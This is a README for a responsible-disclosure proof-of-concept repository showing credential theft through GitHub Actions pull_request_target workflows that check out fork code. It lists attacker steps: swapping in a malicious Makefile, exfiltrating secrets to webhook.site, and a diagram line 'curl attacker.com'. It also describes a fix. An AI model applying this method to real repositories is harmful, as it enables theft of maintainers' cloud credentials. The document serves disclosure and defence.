# PoC: `pull_request_target` + Fork Checkout = Credential Theft

> **Purpose**: Responsible-disclosure reproduction for HackerOne #3601323.  
> This repo demonstrates the same dangerous CI/CD pattern found in  
> [`kubernetes/minikube` `functional_extra.yml`](https://github.com/kubernetes/minikube/blob/HEAD/.github/workflows/functional_extra.yml).

---

## Quick Setup

### Prerequisites
- **Two GitHub accounts** (Account A = owner, Account B = attacker)
- A free [webhook.site](https://webhook.site) URL for exfiltration proof

### 1. Create the upstream repo (Account A)

```bash
cd ~/poc-prt-vuln
git init
git add .
git commit -m "initial: vulnerable workflow PoC"
```

Create a **new public repo** on GitHub (e.g. `poc-prt-vuln`), then push:

```bash
git remote add origin https://github.com/fitzpr/poc-prt-vuln.git
git branch -M main
git push -u origin main
```

### 2. Add dummy secrets (Account A)

Go to **Settings → Secrets and variables → Actions → New repository secret** and add:

| Secret Name          | Value                    |
|----------------------|--------------------------|
| `AZ_CLIENT_ID`       | `DUMMY-CLIENT-ID-12345`  |
| `AZ_CLIENT_SECRET`   | `DUMMY-SECRET-ABCDE`     |
| `AZ_SUBSCRIPTION_ID` | `DUMMY-SUB-00000`        |
| `AZ_TENANT_ID`       | `DUMMY-TENANT-99999`     |

### 3. Fork the repo (Account B)

From Account B (`h1attackeraccount`), fork `fitzpr/poc-prt-vuln`.

### 4. Replace the Makefile in the fork (Account B)

Replace the fork's `Makefile` with the contents of `attacker-fork/Makefile`.  
Update `EXFIL_URL` to your webhook.site URL.

### 5. Open a Pull Request (Account B)

Open a PR from Account B's fork to Account A's main branch.  
Use an innocent-looking title: *"fix: correct typo in README"*

### 6. Apply the label (Account A)

On the PR, add the label: **`ok-to-test`**

> This triggers the `pull_request_target` workflow with secrets.

### 7. Watch the attack

- Go to **Actions** → see the workflow run
- Open the **build step logs** → the attacker's Makefile dumps & exfils credentials
- Go to **webhook.site** → credentials appear as a POST body

---

## File Overview

```
.github/
  workflows/
    vulnerable-workflow.yml   ← Reproduces the minikube vuln pattern
    fixed-workflow.yml        ← Recommended safe pattern (workflow_run)
Makefile                      ← Innocent upstream Makefile
attacker-fork/
    Makefile                  ← Malicious Makefile the attacker uses
VIDEO_SCRIPT.txt              ← Narrated recording guide for the PoC video
README.md                     ← This file
```

---

## The Vulnerability Pattern

```
pull_request_target (fires with repo secrets)
       │
       ▼
actions/checkout@v4  ref: PR head SHA  ← FORK code now on runner
       │
       ▼
azure/login@v2  with: secrets.*        ← Credentials in env
       │
       ▼
make build                             ← Fork's Makefile executes
       │                                  with Azure creds available
       ▼
curl attacker.com ← credentials gone
```

## The Fix

Use `workflow_run` to separate privilege from untrusted code:

```
Workflow 1 (no secrets):          Workflow 2 (has secrets):
  pull_request → validate PR  ──►  workflow_run → checkout UPSTREAM
                                                → azure/login
                                                → make build
```

See `.github/workflows/fixed-workflow.yml` for the complete example.
